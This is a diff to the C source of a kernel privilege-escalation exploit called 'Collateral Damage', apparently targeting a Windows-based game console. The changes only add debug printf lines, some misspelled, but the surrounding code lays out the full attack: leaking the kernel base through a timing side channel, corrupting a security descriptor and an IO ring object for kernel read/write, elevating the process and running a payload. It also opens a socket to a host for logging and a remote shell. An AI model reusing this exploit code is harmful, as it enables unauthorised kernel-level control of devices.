@@ -243,10 +243,13 @@ int do_exploit()
     getobjptr(&ullSystemEPROCaddr, 4, 4);
 
     // corrupt the security descriptor
-    do_write(nt_base + sd_ptr_offset - 0x18);
-    do_write(nt_base + sd_ptr_offset - 0x18 - 1);
-    do_write(nt_base + sd_ptr_offset - 0x18 - 2);
-    do_write(nt_base + sd_ptr_offset - 0x18 - 3);
+
+	printf("we got far B\n");
+	
+    do_write(nt_base + sd_ptr_offset - 0x18); printf("we got far A\n");
+    do_write(nt_base + sd_ptr_offset - 0x18 - 1); printf("we got far A\n");
+    do_write(nt_base + sd_ptr_offset - 0x18 - 2); printf("we got far A\n");
+    do_write(nt_base + sd_ptr_offset - 0x18 - 3); printf("we got far A\n");
 
     ullSystemEPROCaddr = 0;
     getobjptr(&ullSystemEPROCaddr, 4, 4);
@@ -304,6 +307,8 @@ VOID dump_timings(const char* output_file, PUINT32 timings)
 
 UINT64 do_sidechannel(/*SHELLCODE_CTX* ctx, const char* dump_path*/)
 {
+    printf("were doing the sidechannel!");
+	
     CHAR dump_path[0x200] = { 0 };
     ExpandEnvironmentStringsA("%LOCALAPPDATA%\\..\\LocalState\\timings.bin", dump_path, sizeof(dump_path));
 
@@ -418,6 +423,13 @@ int main(int argc, char** argv)
     CHAR* cur_msg = NULL;
 	CHAR* file_part = NULL;
 
+    printf("===============================");
+    printf(" collateral damage");
+	           printf("devMode edition");
+    printf("===============================");
+
+    printf("--> connecting to host for logging and remote shell, even though this dose ssh thingy!");
+	
     // Connect to the host for logging & remote shell
     int start = WSAStartup(MAKEWORD(2, 2), &wsaData);
     winSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
@@ -428,6 +440,7 @@ int main(int argc, char** argv)
 
     // Write our banner message
     cur_msg = "Collateral Damage - @carrot_c4k3 & @landaire (exploits.forsale)\n";
+    printf("Collateral Damage - @carrot_c4k3 & @landaire (exploits.forsale)");
     send(winSock, cur_msg, strlen(cur_msg), 0);
 
     // Get and print the build number
@@ -454,6 +467,7 @@ int main(int argc, char** argv)
 
     if (build_rev == 0)
     {
+	printf("---> UNSUPORTED!");
         cur_msg = "Unsupported build! Aborting.\n";
         send(winSock, cur_msg, strlen(cur_msg), 0);
         exit(0);
@@ -463,6 +477,7 @@ int main(int argc, char** argv)
 
     // Attempt to leak the kernel address
     cur_msg = "Attempting to find kernel base...\n";
+    printf("%s", cur_msg);
     send(winSock, cur_msg, strlen(cur_msg), 0);
     FlushFileBuffers(winSock);
     UINT64 nt_base = do_sidechannel();
@@ -472,6 +487,7 @@ int main(int argc, char** argv)
     if (nt_base == 0)
     {
         cur_msg = "Failed to find kernel base! Reboot your console and try again.\n";
+	     printf("%s", cur_msg);
         send(winSock, cur_msg, strlen(cur_msg), 0);
         exit(0);
         return 0;
@@ -479,37 +495,44 @@ int main(int argc, char** argv)
 
     // Log the kernel base we leaked
     sprintf_s(ptr_msg, sizeof(ptr_msg), "Found likely kernel base: %p\n", nt_base);
+	 printf("%s", ptr_msg);
     send(winSock, ptr_msg, strlen(ptr_msg), 0);
     
     // Do the first part of the exploit: corrupting SeMediumDaclSd
     cur_msg = "Attempting exploit...\n";
+	 printf("%s", cur_msg);
     send(winSock, cur_msg, strlen(cur_msg), 0);
     do_exploit();
 
     // If we succeeded the system EPROC should be non-null
     if (ullSystemEPROCaddr == 0)
     {
+	     printf("EXploit failed!\n");
         cur_msg = "Exploit failed! Reboot your console and try again.\n";
         send(winSock, cur_msg, strlen(cur_msg), 0);
         exit(0);
         return 0;
     }
 
+
     // Setup the IO ring
     ioring_addr = 0;
     int res = ioring_setup(&ioring_addr);
     if (res != 0)
     {
+	    printf("ioring setup failed!\n");
         sprintf_s(ptr_msg, sizeof(ptr_msg), "IO Ring setup failed. Result: %i\nReboot your console and try again.\n", res);
         send(winSock, ptr_msg, strlen(ptr_msg), 0);
     }
 
+printf("corrupting....\n");
     // Corrupt the IO ring object
     do_write(ioring_addr + 0x9D);
 
     // Get kernel RW & elevate our process, then fix up SeMediumDaclSd
     ioring_lpe2(GetCurrentProcessId(), 0x65007500, 0x1000, ioring_addr, g_kernel_base);
     cur_msg = "Exploit succeeded! Running payload!\n\n";
+	 printf("%s", cur_msg);
     send(winSock, cur_msg, strlen(cur_msg), 0);
 
     // Run our post-exploitation code
